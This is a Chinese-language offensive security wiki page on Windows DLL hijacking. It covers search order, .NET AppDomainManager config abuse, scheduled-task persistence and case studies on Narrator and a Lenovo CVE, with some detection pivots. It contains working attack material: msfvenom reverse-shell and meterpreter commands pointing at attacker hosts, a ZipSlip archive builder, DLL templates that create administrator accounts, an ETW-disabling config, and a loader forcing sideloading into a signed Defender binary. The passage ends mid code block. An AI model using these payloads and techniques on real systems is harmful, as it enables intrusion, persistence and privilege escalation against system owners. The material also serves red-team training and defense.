# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking 涉及诱导受信任的应用程序加载恶意 DLL。这个术语涵盖了多种技术，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久化，较少用于权限提升。尽管这里重点是提权，但 hijacking 的方法在不同目标之间是一致的。

### Common Techniques

DLL hijacking 使用了多种方法，每种方法的有效性取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**：用恶意 DLL 替换真正的 DLL，可选择使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在搜索路径中，优先于合法 DLL，利用应用程序的搜索顺序。
3. **Phantom DLL Hijacking**：为应用程序创建一个恶意 DLL，让它误以为这是一个不存在但需要加载的 DLL。
4. **DLL Redirection**：修改 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件等搜索参数，将应用程序导向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在用户可控目录中，并与复制的应用程序一起放置，类似于 Binary Proxy Execution 技术。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

经典的 DLL sideloading 不是让受信任的 **.NET Framework** 进程加载攻击者代码的唯一方式。如果目标可执行文件是一个 **managed** 应用程序，CLR 还会读取一个以可执行文件命名的 **application configuration file**（例如 `Setup.exe.config`）。该文件可以定义一个自定义的 **AppDomainManager**。如果 config 指向一个由攻击者控制、并放在 EXE 旁边的 assembly，CLR 会在应用程序正常代码路径 **之前** 加载它，并在受信任的进程中运行。

根据 Microsoft 的 .NET Framework 配置 schema，要使用自定义 manager，`<appDomainManagerAssembly>` 和 `<appDomainManagerType>` 都必须存在。

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小化管理器：
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
实用说明：
- 这是 **.NET Framework specific** 的技巧。它依赖 CLR 配置解析，而不是 Win32 DLL search order。
- 主机必须真的是一个 **managed EXE**。快速排查：`sigcheck -m target.exe`、`corflags target.exe`，或在 PE metadata 中检查 **CLR Runtime Header**。
- config 文件名必须与可执行文件名完全一致（`<binary>.config`），并且通常放在 **EXE 旁边**。
- 这对 **signed Microsoft/vendor binaries** 很有用，因为受信任的 EXE 保持不变，而恶意 managed assembly 会在进程内执行。
- 如果你已经有一个可写的 installer/update 目录，AppDomainManager hijacking 可以作为 **first stage**，然后再进行经典的 DLL sideloading 或 reflective loading 作为后续阶段。

### AppDomainManager 作为 downloader + scheduled-task bootstrap

一个实用的入侵模式是把受信任的 managed EXE 与一个恶意的 `*.config` 以及一个恶意的 AppDomainManager DLL 配对，而这个 DLL 只充当一个 **小型 bootstrapper**：

1. 用户从一个看起来合理的位置（如 `%USERPROFILE%\Downloads`）启动一个已签名的 .NET installer 或 updater。
2. 旁边的 config 会让 CLR 在合法应用逻辑启动之前就先加载攻击者的 assembly。
3. 恶意 manager 执行一个 **path gate**（例如，只在宿主 EXE 从 `Downloads` 运行时继续，且只允许 second stage 从 `%LOCALAPPDATA%` 运行）。
4. 如果检查通过，它会把真正的 payload 下载到一个用户可写路径，例如 `%LOCALAPPDATA%\PerfWatson2.exe`，并使用 scheduled task 建立持久化。

这个变体的重要性在于：
- 已签名的宿主 EXE 保持不变，所以只对主二进制做 hash 的 triage 可能会漏掉入侵。
- 简单的 **path-based anti-analysis** 很常见：把 ZIP/EXE/DLL 三件套移动到 Desktop、Temp 或 sandbox 路径，可能会故意破坏整个链条。
- 第一阶段的 AppDomainManager DLL 可以保持很小、低噪声，而真正的 implant 会在后面再被拉取。

这种模式下常见的最小持久化示例如下：
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` means **highest available** for that user/session; it is not a guaranteed SYSTEM escalation by itself.
- This technique is often better categorized as **execution/persistence via .NET config abuse** than classic missing-DLL search-order hijacking, even though operators frequently chain both together.

Detection pivots:
- Signed .NET executables launched from **ZIP extraction paths**, `Downloads`, `%TEMP%`, or other user-writable folders with a **colocated** `<exe>.config`.
- New scheduled tasks whose action points into `%LOCALAPPDATA%`, `%APPDATA%`, or `Downloads` and whose names mimic browser/vendor updaters.
- Short-lived managed bootstrap processes that immediately download another EXE, then spawn `schtasks.exe`.
- Samples that exit early unless the executable path matches an expected user-profile directory.

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. Install/run the legitimate software and identify the task it normally creates.
2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
4. Re-register the same task name instead of creating a new obvious persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

最常见的在系统中查找缺失 Dlls 的方法，是从 sysinternals 运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置**以下 **2 个过滤器**：

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

并且只显示 **File System Activity**：

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

如果你是在寻找**一般的 missing dlls**，就让它运行**几秒**。\
如果你是在寻找**某个特定 executable 中的 missing dll**，你应该再加一个过滤器，比如 **"Process Name" "contains" `<exec name>`**，运行它，然后停止捕获事件。

## Exploiting Missing Dlls

为了提升权限，我们最好的机会是能够**写入一个 privileged process 会尝试加载的 dll**，并且把它放在它会被搜索到的某个**位置**。因此，我们可以在一个**文件夹**里**写入**一个 dll，而这个文件夹的搜索顺序在**原始 dll** 所在文件夹之前（特殊情况），或者我们可以**写入**某个会被搜索的文件夹，而原始 **dll** 在任何文件夹里都不存在。

### Dll Search Order

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中你可以找到 Dll 是如何被具体加载的。**

**Windows applications** 会按一组**预定义的搜索路径**查找 DLL，并遵循特定顺序。当一个恶意 DLL 被策略性地放在这些目录之一时，就会发生 DLL hijacking，确保它会在真正的 DLL 之前被加载。防止这种情况的一种方案，是让 application 在引用所需 DLL 时使用绝对路径。

你可以在下面看到 **32-bit** 系统上的 **DLL search order**：

1. application 加载所在的目录。
2. system directory。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录路径。(_C:\Windows\System32_)
3. 16-bit system directory。没有函数可以获取该目录路径，但它会被搜索。(_C:\Windows\System_)
4. Windows directory。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录路径。
1. (_C:\Windows_)
5. 当前目录。
6. PATH 环境变量中列出的目录。注意，这不包括由 **App Paths** 注册表项指定的 per-application path。计算 DLL search path 时不会使用 **App Paths** 键。

这是在启用 **SafeDllSearchMode** 时的**默认**搜索顺序。禁用后，当前目录会升到第二位。要禁用该功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设为 0（默认启用）。

如果 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用，搜索会从 **LoadLibraryEx** 正在加载的 executable module 所在目录开始。

最后，注意 **dll 也可以在加载时直接指定绝对路径，而不是只写名称**。在这种情况下，该 dll **只会在那个路径中被搜索**（如果该 dll 有任何依赖项，它们会像按名称加载一样被搜索）。

还有其他方法可以改变 search order，但这里不展开。

### Chaining an arbitrary file write into a missing-DLL hijack

1. 使用 **ProcMon** filters（`Process Name` = target EXE，`Path` 以 `.dll` 结尾，`Result` = `NAME NOT FOUND`）收集进程探测但找不到的 DLL 名称。
2. 如果 binary 通过 **schedule/service** 运行，把一个同名 DLL 放到 **application directory**（search-order 第 1 项）里，它会在下一次执行时被加载。在一个 .NET scanner 案例中，process 会先在 `C:\samples\app\` 里查找 `hostfxr.dll`，然后才从 `C:\Program Files\dotnet\fxr\...` 加载真正的副本。
3. 构建一个 payload DLL（例如 reverse shell），导出任意函数：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的 primitive 是 **ZipSlip-style arbitrary write**，构造一个 ZIP，使其中的条目逃逸 extraction dir，这样 DLL 就会落到 app folder：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将压缩包投递到被监控的 inbox/share；当计划任务重新启动该进程时，它会加载恶意 DLL 并以 service account 身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种更高级、可确定性地影响新建进程 DLL 搜索路径的方法，是在使用 ntdll 的 native APIs 创建进程时，设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在这里提供一个由攻击者控制的目录，目标进程如果按名称解析某个 imported DLL（没有绝对路径，且没有使用 safe loading 标志），就可以被强制从该目录加载恶意 DLL。

Key idea
- 使用 RtlCreateProcessParametersEx 构建 process parameters，并提供一个自定义的 DllPath，指向你控制的文件夹（例如 dropper/unpacker 所在目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，loader 会在解析过程中查询这个提供的 DllPath，从而即使恶意 DLL 不与目标 EXE 同目录，也能可靠地实现 sideloading。

Notes/limitations
- 这会影响正在创建的 child process；它不同于 SetDllDirectory，后者只影响当前进程。
- 目标必须按名称 import 或 LoadLibrary 一个 DLL（没有绝对路径，并且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被 hijack。forwarded exports 和 SxS 可能改变优先级。

最小 C 示例（ntdll，wide strings，简化错误处理）：

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.

How the chain works:
1. The host EXE starts and the **CLR reads `<exe>.config`**.
2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Windows 文档中关于 dll search order 的例外

Windows 文档中提到了一些标准 DLL search order 的例外：

- 当遇到一个**与内存中已加载 DLL 同名的 DLL**时，系统会绕过通常的搜索流程。它会先检查 redirection 和 manifest，然后才回退到内存中的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果该 DLL 被识别为当前 Windows 版本的一个**known DLL**，系统会直接使用该 known DLL 及其依赖 DLL 的版本，**不再执行搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果一个 **DLL 有依赖项**，这些依赖 DLL 的搜索会像它们只通过**模块名**指定的一样进行，不管最初的 DLL 是否是通过完整路径识别的。

### 提权

**Requirements**：

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并且**检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以用以下方式检查一个可执行文件的 imports 和一个 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86)：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没有看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在某些情况下，你编译的 Dll 必须**导出多个函数**，这些函数会被受害进程加载；如果这些函数不存在，**binary 将无法加载**它们，**exploit 会失败**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>带有用户创建的 C++ DLL 示例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的备用 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 仍然会在启动时探测一个可预测、与语言相关的 localization DLL，该 DLL 可被 hijack 用于 arbitrary code execution 和 persistence。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 安静性
- 天真的 hijack 会发出声音/高亮 UI。为了保持安静，在 attach 时枚举 Narrator 线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并 `SuspendThread` 它；在你自己的线程中继续。完整代码见 PoC。

通过 Accessibility 配置触发和持久化
- 用户上下文 (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述配置，启动 Narrator 会加载植入的 DLL。在 secure desktop（登录界面）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。

RDP 触发的 SYSTEM 执行（lateral movement）
- 允许经典 RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 通过 RDP 连接到主机，在登录界面按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。
- RDP 会话关闭时执行停止——请尽快注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置 Accessibility Tool (AT) 的 registry 项（例如 CursorIndicator），把它编辑为指向任意 binary/DLL，导入后再将 `configuration` 设为该 AT 名称。这样就能通过 Accessibility framework 代理任意执行。

Notes
- 在 `%windir%\System32` 下写入以及修改 HKLM 值需要 admin 权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要 exports。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

这个案例演示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，被追踪为 **CVE-2025-1729**。

### Vulnerability Details

- **Component**: 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\` 的 `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 9:30 AM 以已登录用户的上下文运行。
- **Directory Permissions**: `CREATOR OWNER` 可写，允许本地用户投放任意文件。
- **DLL Search Behavior**: 会先尝试从其工作目录加载 `hostfxr.dll`，如果缺失则记录 "NAME NOT FOUND"，表明本地目录搜索优先级更高。

### Exploit Implementation

攻击者可以在同一目录放置一个恶意的 `hostfxr.dll` stub，利用缺失的 DLL 在用户上下文下实现 code execution：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 作为标准用户，将 `hostfxr.dll` 放到 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待 scheduled task 在当前用户上下文中于上午 9:30 运行。
3. 如果 task 执行时有 administrator 已登录，恶意 DLL 会在 administrator 的 session 中以 medium integrity 运行。
4. 结合标准 UAC bypass techniques，将权限从 medium integrity 提升到 SYSTEM privileges。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors 经常将基于 MSI 的 droppers 与 DLL side-loading 配对使用，以便在受信任、已签名的 process 下执行 payload。

Chain overview
- User 下载 MSI。一个 CustomAction 会在 GUI install 期间静默运行（例如，LaunchApplication 或一个 VBScript action），从嵌入式资源中重建下一阶段。
- dropper 会把一个合法的、已签名的 EXE 和一个恶意 DLL 写到同一目录（示例组合：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当启动这个已签名的 EXE 时，Windows DLL search order 会优先从 working directory 加载 wsc.dll，从而在已签名的 parent 下执行 attacker code（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找会运行 executables 或 VBScript 的条目。示例可疑模式：LaunchApplication 在后台执行一个嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中检查 CustomAction、InstallExecuteSequence 和 Binary tables。
- MSI CAB 中的嵌入/拆分 payloads：
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- 或使用 lessmsi：`lessmsi x package.msi C:\out`
- 查找多个小 fragments，它们会被 VBScript CustomAction 连接并解密。常见流程：
```vb
